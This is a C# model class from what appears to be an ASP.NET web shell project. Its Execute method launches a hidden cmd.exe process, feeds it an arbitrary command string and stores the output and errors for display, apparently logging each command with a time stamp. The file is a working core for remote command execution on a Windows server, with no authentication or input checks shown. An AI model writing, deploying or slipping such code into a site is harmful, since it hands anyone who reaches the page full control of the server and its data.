using System.Diagnostics;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;

namespace WebShell.Models
{
    public class CommandModel
    {
        [Key]
        public int? Id { get; set; }
        public DateTime? Time { get; set; } = DateTime.Now;
        public string? Source { get; set; }
        public string? Result { get; set; }

        public void Execute()
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();


            cmd.StandardInput.WriteLine(Source);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            var exited = cmd.WaitForExit(5000);

            if (!exited)
            {
                Result = "Time is over";
                return;
            }
            

            var error = cmd.StandardError.ReadToEnd();
            if (error.Length != 0)
            {
                Result = error;
            }
            else
            {
                List<string> output = new List<string>();
                string buf;

                while ((buf = cmd.StandardOutput.ReadLine()) != null)
                {
                    output.Add(buf);
                }

                Result = String.Join(" ", output.GetRange(4, output.Count - 5));
            }
        }
    }
}
